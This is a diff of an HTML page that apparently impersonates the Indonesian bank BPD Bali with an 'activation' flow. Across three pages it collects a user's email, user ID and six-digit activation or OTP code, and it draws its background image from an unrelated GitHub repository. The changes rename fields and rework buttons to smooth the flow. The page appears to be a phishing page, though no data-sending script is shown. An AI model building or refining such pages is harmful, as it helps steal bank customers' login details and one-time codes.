@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>BANK BPD Bali - aktivasi</title>
+    <title>BPD Bali - Aktivasi</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
@@ -12,6 +12,7 @@
 <div id="page1" class="page active">
     <img class="bg-image" src="https://raw.githubusercontent.com/danajer/Inissisuhyw/refs/heads/main/haiwiwwiwi.jpg" alt="bg">
     <button class="btn-nav" onclick="pindahHalaman('page2')">Aktivasi</button>
+    <button class="btn-nav btn-nav-second" onclick="pindahHalaman('page2')">Cetak Laporan / Pemulihan</button>
 </div>
 
 <!-- HALAMAN 2 -->
@@ -47,9 +48,9 @@
             <input type="email" class="form-input" id="email" inputmode="email">
         </div>
         <div class="info-text" id="infoPage2">* Harap isi semua data</div>
+        
+        <button class="btn-action" id="btnLanjut" onclick="lanjutKePage3()">Cetak Laporan / Pemulihan</button>
     </div>
-    
-    <button class="btn-action hidden" id="btnLanjut" onclick="lanjutKePage3()">Cetak Laporan / Pemulihan</button>
 </div>
 
 <!-- HALAMAN 3 -->
@@ -61,24 +62,20 @@
     </div>
     
     <div class="form-container form-page3" id="formPage3">
-        <div class="form-title">Kode Aktivasi</div>
+        <div class="form-title">Aktivasi</div>
         <div class="form-divider"></div>
         
         <div class="form-row">
-            <span class="form-label">Username</span>
+            <span class="form-label">User.id</span>
             <input type="text" class="form-input" id="username" inputmode="text">
         </div>
         <div class="form-row">
-            <span class="form-label">Kode OTP</span>
+            <span class="form-label">Kode Aktivasi</span>
             <input type="text" class="form-input" id="kodeOtp" maxlength="6" inputmode="numeric" pattern="[0-9]*">
         </div>
-        <div class="error-message" id="errorMessage"></div>
-        <div class="info-text" id="infoPage3">* Masukkan kode OTP aktivasi</div>
-    </div>
-    
-    <!-- Tombol dengan wrapper untuk keyboard -->
-    <div class="button-wrapper" id="buttonWrapper">
-        <button class="btn-action" id="btnVerifikasi" onclick="selesai()">Cetak Laporan / Pemulihan</button>
+        <div class="info-text" id="infoPage3">* Masukkan kode aktivasi</div>
+        
+        <button class="btn-action" id="btnVerifikasi" onclick="verifikasiKode()">Cetak Laporan / Pemulihan</button>
     </div>
 </div>
 
